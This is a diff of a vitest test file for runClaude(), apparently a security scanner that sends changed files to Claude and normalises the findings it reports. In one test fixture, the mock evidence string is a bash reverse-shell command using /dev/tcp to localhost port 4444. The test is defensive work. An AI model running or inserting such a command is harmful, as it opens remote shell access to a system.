@@ -1,11 +1,17 @@
 import { describe, it, expect, vi, beforeEach } from 'vitest';
 
 const mockCreate  = vi.fn();
+const mockBetaCreate = vi.fn();
 const mockReadFile = vi.fn();
+const mockClientInitialization = vi.fn();
 
 vi.mock('@anthropic-ai/sdk', () => ({
   default: function Anthropic() {
-    return { messages: { create: mockCreate } };
+    mockClientInitialization();
+    return {
+      messages: { create: mockCreate },
+      beta: { messages: { create: mockBetaCreate } },
+    };
   },
 }));
 
@@ -60,49 +66,136 @@ function noToolCallResponse() {
 describe('runClaude()', () => {
   beforeEach(() => vi.clearAllMocks());
 
-  it('returns an empty array immediately when changedFiles is empty', async () => {
-    const findings = await runClaude({ workspacePath: WORKSPACE, changedFiles: [] });
-    expect(findings).toEqual([]);
+  it('returns complete with no findings when enabled and changedFiles is empty', async () => {
+    const result = await runClaude({ workspacePath: WORKSPACE, changedFiles: [], toolConfig: ENABLED_CONFIG });
+    expect(result).toEqual({ findings: [], status: { outcome: 'complete' } });
     expect(mockCreate).not.toHaveBeenCalled();
   });
 
-  it('returns an empty array immediately when changedFiles is null', async () => {
-    const findings = await runClaude({ workspacePath: WORKSPACE, changedFiles: null });
-    expect(findings).toEqual([]);
+  it('returns complete with no findings when enabled and changedFiles is null', async () => {
+    const result = await runClaude({ workspacePath: WORKSPACE, changedFiles: null, toolConfig: ENABLED_CONFIG });
+    expect(result).toEqual({ findings: [], status: { outcome: 'complete' } });
     expect(mockCreate).not.toHaveBeenCalled();
   });
 
-  it('returns an empty array immediately when toolConfig.enabled is false', async () => {
-    const findings = await runClaude({
+  it('returns disabled immediately when toolConfig.enabled is false', async () => {
+    const result = await runClaude({
       workspacePath: WORKSPACE,
       changedFiles:  CHANGED_FILES,
       toolConfig:    { enabled: false, model: 'claude-haiku-4-5-20251001' },
     });
-    expect(findings).toEqual([]);
+    expect(result).toEqual({ findings: [], status: { outcome: 'disabled' } });
     expect(mockCreate).not.toHaveBeenCalled();
     expect(mockReadFile).not.toHaveBeenCalled();
   });
 
-  it('returns an empty array when the model makes no tool call', async () => {
+  it('returns incomplete when the model makes no report_findings tool call', async () => {
     mockReadFile.mockResolvedValueOnce(DUMMY_CONTENT);
     mockCreate.mockResolvedValueOnce(noToolCallResponse());
-    const findings = await runClaude({
+    const result = await runClaude({
       workspacePath: WORKSPACE,
       changedFiles:  CHANGED_FILES,
       toolConfig:    ENABLED_CONFIG,
     });
-    expect(findings).toEqual([]);
+    expect(result).toEqual({
+      findings: [],
+      status: { outcome: 'incomplete', reason: 'invalid-provider-response' },
+    });
   });
 
-  it('returns an empty array when tool call has no findings', async () => {
+  it('returns incomplete when report_findings has no findings array', async () => {
+    mockReadFile.mockResolvedValueOnce(DUMMY_CONTENT);
+    mockCreate.mockResolvedValueOnce({
+      content: [{ type: 'tool_use', name: 'report_findings', input: {} }],
+    });
+
+    const result = await runClaude({
+      workspacePath: WORKSPACE,
+      changedFiles: CHANGED_FILES,
+      toolConfig: ENABLED_CONFIG,
+    });
+
+    expect(result).toEqual({
+      findings: [],
+      status: { outcome: 'incomplete', reason: 'invalid-provider-response' },
+    });
+  });
+
+  it('retains valid findings when a sibling provider finding is malformed', async () => {
+    mockReadFile.mockResolvedValueOnce(DUMMY_CONTENT);
+    mockCreate.mockResolvedValueOnce(findingResponse([
+      {
+        file: 'src/app.js', startLine: 2, endLine: 2, severity: 'high',
+        message: 'Backdoor', ruleId: 'backdoor', evidence: 'bad()',
+      },
+      { file: 'src/app.js', severity: 'high' },
+    ]));
+
+    const result = await runClaude({
+      workspacePath: WORKSPACE,
+      changedFiles: CHANGED_FILES,
+      toolConfig: ENABLED_CONFIG,
+    });
+
+    expect(result.status).toEqual({ outcome: 'incomplete', reason: 'invalid-provider-response' });
+    expect(result.findings).toHaveLength(1);
+    expect(result.findings[0].ruleId).toBe('claude/backdoor');
+  });
+
+  it('retains findings but marks multiple report tool calls invalid', async () => {
+    mockReadFile.mockResolvedValueOnce(DUMMY_CONTENT);
+    mockCreate.mockResolvedValueOnce({
+      content: [
+        { type: 'tool_use', name: 'report_findings', input: { findings: [] } },
+        findingResponse([{
+          file: 'src/app.js', startLine: 3, endLine: 3, severity: 'high',
+          message: 'Backdoor', ruleId: 'backdoor', evidence: 'bad()',
+        }]).content[0],
+      ],
+    });
+
+    const result = await runClaude({
+      workspacePath: WORKSPACE,
+      changedFiles: CHANGED_FILES,
+      toolConfig: ENABLED_CONFIG,
+    });
+
+    expect(result.status).toEqual({ outcome: 'incomplete', reason: 'invalid-provider-response' });
+    expect(result.findings).toHaveLength(1);
+  });
+
+  it('rejects unsupported severity values without losing valid siblings', async () => {
+    mockReadFile.mockResolvedValueOnce(DUMMY_CONTENT);
+    mockCreate.mockResolvedValueOnce(findingResponse([
+      {
+        file: 'src/app.js', startLine: 2, endLine: 2, severity: 'HIGH',
+        message: 'Bad severity', ruleId: 'bad-severity', evidence: 'bad()',
+      },
+      {
+        file: 'src/app.js', startLine: 4, endLine: 4, severity: 'medium',
+        message: 'Valid', ruleId: 'valid', evidence: 'valid()',
+      },
+    ]));
+
+    const result = await runClaude({
+      workspacePath: WORKSPACE,
+      changedFiles: CHANGED_FILES,
+      toolConfig: ENABLED_CONFIG,
+    });
+
+    expect(result.status).toEqual({ outcome: 'incomplete', reason: 'invalid-provider-response' });
+    expect(result.findings.map(finding => finding.ruleId)).toEqual(['claude/valid']);
+  });
+
+  it('returns complete when tool call has no findings', async () => {
     mockReadFile.mockResolvedValueOnce(DUMMY_CONTENT);
     mockCreate.mockResolvedValueOnce(cleanResponse());
-    const findings = await runClaude({
+    const result = await runClaude({
       workspacePath: WORKSPACE,
       changedFiles:  CHANGED_FILES,
       toolConfig:    ENABLED_CONFIG,
     });
-    expect(findings).toEqual([]);
+    expect(result).toEqual({ findings: [], status: { outcome: 'complete' } });
   });
 
   it('maps a finding to the common format with ruleId prefixed and tool set', async () => {
@@ -119,14 +212,15 @@ describe('runClaude()', () => {
       evidence: 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1',
     }]));
 
-    const findings = await runClaude({
+    const result = await runClaude({
       workspacePath: WORKSPACE,
       changedFiles:  CHANGED_FILES,
       toolConfig:    ENABLED_CONFIG,
     });
 
-    expect(findings).toHaveLength(1);
-    expect(findings[0]).toMatchObject({
+    expect(result.status).toEqual({ outcome: 'complete' });
+    expect(result.findings).toHaveLength(1);
+    expect(result.findings[0]).toMatchObject({
       file:     'src/app.js',
       line:     42,
       startLine: 42,
@@ -148,17 +242,18 @@ describe('runClaude()', () => {
       { file: 'b.js', startLine: 2, endLine: 3, severity: 'medium', message: 'meh', ruleId: 'r2', evidence: 'meh' },
     ]));
 
-    const findings = await runClaude({
+    const result = await runClaude({
       workspacePath: WORKSPACE,
       changedFiles:  ['a.js', 'b.js'],
       toolConfig:    ENABLED_CONFIG,
     });
 
-    expect(findings).toHaveLength(2);
-    expect(findings[0].startLine).toBe(1);
-    expect(findings[1].endLine).toBe(3);
-    expect(findings[0].ruleId).toBe('claude/r1');
-    expect(findings[1].ruleId).toBe('claude/r2');
+    expect(result.status).toEqual({ outcome: 'complete' });
+    expect(result.findings).toHaveLength(2);
+    expect(result.findings[0].startLine).toBe(1);
+    expect(result.findings[1].endLine).toBe(3);
+    expect(result.findings[0].ruleId).toBe('claude/r1');
+    expect(result.findings[1].ruleId).toBe('claude/r2');
   });
 
   it('skips binary files and does not include them in the API call', async () => {
@@ -197,28 +292,158 @@ describe('runClaude()', () => {
     expect(userContent).not.toContain('image.jpg');
   });
 
-  it('returns empty array and does not call the API when all files are binary', async () => {
-    const findings = await runClaude({
+  it('returns complete and does not call the API when all files are binary', async () => {
+    const result = await runClaude({
       workspacePath: WORKSPACE,
       changedFiles:  ['image.png', 'archive.zip'],
       toolConfig:    ENABLED_CONFIG,
     });
 
-    expect(findings).toEqual([]);
+    expect(result).toEqual({ findings: [], status: { outcome: 'complete' } });
     expect(mockCreate).not.toHaveBeenCalled();
   });
 
-  it('catches API errors and returns an empty array', async () => {
+  it('returns complete when a selected file is truncated to the 50KB limit', async () => {
+    mockReadFile.mockResolvedValueOnce('a'.repeat(60_000));
+    mockCreate.mockResolvedValueOnce(cleanResponse());
+
+    const result = await runClaude({
+      workspacePath: WORKSPACE,
+      changedFiles: CHANGED_FILES,
+      toolConfig: ENABLED_CONFIG,
+    });
+
+    expect(result.status).toEqual({ outcome: 'complete' });
+    const callArgs = mockCreate.mock.calls[0][0] as { messages: Array<{ content: string }> };
+    expect(callArgs.messages[0].content).toContain('[truncated]');
+  });
+
+  it('marks API errors incomplete without exposing the raw error', async () => {
     mockReadFile.mockResolvedValueOnce(DUMMY_CONTENT);
     mockCreate.mockRejectedValueOnce(new Error('API rate limit exceeded'));
 
-    const findings = await runClaude({
+    const result = await runClaude({
       workspacePath: WORKSPACE,
       changedFiles:  CHANGED_FILES,
       toolConfig:    ENABLED_CONFIG,
     });
 
-    expect(findings).toEqual([]);
+    expect(result).toEqual({
+      findings: [],
+      status: { outcome: 'incomplete', reason: 'api-batch-failed' },
+    });
+    expect(JSON.stringify(result.status)).not.toContain('rate limit');
+  });
+
+  it('marks client initialization failures incomplete without exposing the raw error', async () => {
+    mockReadFile.mockResolvedValueOnce(DUMMY_CONTENT);
+    mockClientInitialization.mockImplementationOnce(() => {
+      throw new Error('secret initialization details');
+    });
+
+    const result = await runClaude({
+      workspacePath: WORKSPACE,
+      changedFiles: CHANGED_FILES,
+      toolConfig: ENABLED_CONFIG,
+    });
+
+    expect(result).toEqual({
+      findings: [],
+      status: { outcome: 'incomplete', reason: 'client-initialization-failed' },
+    });
+    expect(JSON.stringify(result.status)).not.toContain('secret initialization details');
+    expect(mockCreate).not.toHaveBeenCalled();
+  });
+
+  it('retains findings from successful batches when another batch fails', async () => {
+    mockCreate
+      .mockRejectedValueOnce(new Error('provider unavailable'))
+      .mockResolvedValueOnce(findingResponse([{
+        file: 'src/b.js',
+        startLine: 1,
+        endLine: 1,
+        severity: 'high',
+        message: 'bad',
+        ruleId: 'backdoor',
+        evidence: 'bad',
+      }]));
+
+    const result = await runClaude({
+      workspacePath: WORKSPACE,
+      changedFiles: ['src/a.js', 'src/b.js'],
+      promptFiles: [
+        { file: 'src/a.js', content: 'a'.repeat(60_000) },
+        { file: 'src/b.js', content: 'b'.repeat(60_000) },
+      ],
+      toolConfig: ENABLED_CONFIG,
+    });
+
+    expect(mockCreate).toHaveBeenCalledTimes(2);
+    expect(result.status).toEqual({ outcome: 'incomplete', reason: 'api-batch-failed' });
+    expect(result.findings).toHaveLength(1);
+    expect(result.findings[0].ruleId).toBe('claude/backdoor');
+  });
+
+  it('marks a changed file missing from prepared prompt files incomplete', async () => {
+    mockCreate.mockResolvedValueOnce(cleanResponse());
+
+    const result = await runClaude({
+      workspacePath: WORKSPACE,
+      changedFiles: ['src/a.js', 'src/b.js'],
+      changedLineRanges: new Map([
+        ['src/a.js', [{ start: 1, end: 1 }]],
+        ['src/b.js', [{ start: 1, end: 1 }]],
+      ]),
+      promptFiles: [{ file: 'src/a.js', content: 'const a = 1;' }],
+      toolConfig: ENABLED_CONFIG,
+    });
+
+    expect(result.status).toEqual({ outcome: 'incomplete', reason: 'file-read-failed' });
+  });
+
+  it('passes the signal to prompt requests and stops before the next batch when cancelled', async () => {
+    const controller = new AbortController();
+    const reason = new Error('scan cancelled');
+    mockCreate.mockImplementationOnce(async (_params: unknown, options: { signal?: AbortSignal }) => {
+      expect(options.signal).toBe(controller.signal);
+      controller.abort(reason);
+      return cleanResponse();
+    });
+
+    await expect(runClaude({
+      workspacePath: WORKSPACE,
+      changedFiles: ['src/a.js', 'src/b.js'],
+      promptFiles: [
+        { file: 'src/a.js', content: 'a'.repeat(60_000) },
+        { file: 'src/b.js', content: 'b'.repeat(60_000) },
+      ],
+      toolConfig: ENABLED_CONFIG,
+      signal: controller.signal,
+    })).rejects.toBe(reason);
+    expect(mockCreate).toHaveBeenCalledOnce();
+  });
+
+  it('passes the signal to skill requests and stops pause_turn continuations when cancelled', async () => {
+    const controller = new AbortController();
+    const reason = new Error('scan cancelled');
+    mockBetaCreate.mockImplementationOnce(async (_params: unknown, options: { signal?: AbortSignal }) => {
+      expect(options.signal).toBe(controller.signal);
+      controller.abort(reason);
+      return {
+        content: [{ type: 'text', text: 'continuing' }],
+        stop_reason: 'pause_turn',
+        container: { id: 'container-1' },
+      };
+    });
+
+    await expect(runClaude({
+      workspacePath: WORKSPACE,
+      changedFiles: CHANGED_FILES,
+      promptFiles: [{ file: 'src/app.js', content: DUMMY_CONTENT }],
+      toolConfig: { ...ENABLED_CONFIG, skill: { id: 'skill-1' } },
+      signal: controller.signal,
+    })).rejects.toBe(reason);
+    expect(mockBetaCreate).toHaveBeenCalledOnce();
   });
 
   it('passes the configured model to the API', async () => {
@@ -251,19 +476,22 @@ describe('runClaude()', () => {
     }));
   });
 
-  it('skips unreadable files silently and continues', async () => {
+  it('marks unreadable selected files incomplete and continues', async () => {
     mockReadFile
       .mockRejectedValueOnce(new Error('ENOENT'))
       .mockResolvedValueOnce(DUMMY_CONTENT);
     mockCreate.mockResolvedValueOnce(cleanResponse());
 
-    const findings = await runClaude({
+    const result = await runClaude({
       workspacePath: WORKSPACE,
       changedFiles:  ['missing.js', 'src/app.js'],
       toolConfig:    ENABLED_CONFIG,
     });
 
-    expect(findings).toEqual([]);
+    expect(result).toEqual({
+      findings: [],
+      status: { outcome: 'incomplete', reason: 'file-read-failed' },
+    });
     // API was still called with the readable file
     const callArgs    = mockCreate.mock.calls[0][0] as { messages: Array<{ content: string }> };
     const userContent = callArgs.messages[0].content;
@@ -315,12 +543,15 @@ describe('runClaude()', () => {
       evidence: 'console.log("hello");',
     }]));
 
-    const [finding] = await runClaude({
+    const result = await runClaude({
       workspacePath: WORKSPACE,
       changedFiles: CHANGED_FILES,
       toolConfig: ENABLED_CONFIG,
     });
+    const [finding] = result.findings;
 
+    expect(finding).toBeDefined();
+    if (!finding) throw new Error('expected a finding');
     expect(finding.line).toBe(7);
     expect(finding.startLine).toBe(7);
     expect(finding.endLine).toBe(7);
@@ -358,16 +589,17 @@ describe('runClaude()', () => {
       evidence: 'eval(input)',
     }]));
 
-    const findings = await runClaude({
+    const result = await runClaude({
       workspacePath: WORKSPACE,
       changedFiles:  CHANGED_FILES,
       promptFiles,
       toolConfig:    ENABLED_CONFIG,
     });
 
-    expect(findings).toHaveLength(1);
-    expect(findings[0].ruleId).toBe('claude/eval-injection');
-    expect(findings[0].startLine).toBe(3);
+    expect(result.status).toEqual({ outcome: 'complete' });
+    expect(result.findings).toHaveLength(1);
+    expect(result.findings[0].ruleId).toBe('claude/eval-injection');
+    expect(result.findings[0].startLine).toBe(3);
   });
 
   it('falls back to reading files from disk when promptFiles is empty', async () => {
